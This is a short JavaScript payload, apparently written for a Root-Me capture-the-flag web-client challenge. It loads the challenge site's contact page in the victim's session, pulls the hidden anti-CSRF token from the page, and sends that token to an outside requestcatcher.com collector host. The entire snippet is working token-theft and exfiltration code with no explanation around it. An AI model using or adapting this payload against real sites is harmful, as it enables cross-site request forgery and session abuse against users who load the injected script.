const fn = async () => {
const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact');
const resp = await req.text();

const parser = new DOMParser();
const doc = parser.parseFromString(resp, "text/html");
const token = doc.querySelector('#token').value;

fetch(`https://tyyhty.requestcatcher.com/${token}`)



};

fn()
